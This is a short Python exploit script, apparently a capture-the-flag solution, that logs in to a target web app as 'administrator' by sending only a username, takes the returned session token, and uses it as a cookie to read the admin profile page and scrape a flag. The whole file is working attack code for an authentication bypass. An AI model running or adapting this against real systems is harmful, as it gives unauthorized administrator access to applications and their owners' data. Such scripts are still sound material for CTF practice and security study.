import requests
from bs4 import BeautifulSoup

try:

    target_url = input('Target URL <http://ip:port>: ')

    # Catch admin token

    login_as_admin = requests.post(target_url + '/index.php/login', json = {'username': 'administrator'})

    acc_token = login_as_admin.json().get('token')

    # Add token to /profile header request

    login_to_admin_profile = requests.get(target_url + '/index.php/profile', cookies={'token':acc_token})

    html_content = login_to_admin_profile.text

    soup = BeautifulSoup(html_content, 'html.parser')

    flag = soup.find('div', class_='home__desc').get_text().strip()

    print(flag) 

except KeyboardInterrupt:
  
  print("\nBye!")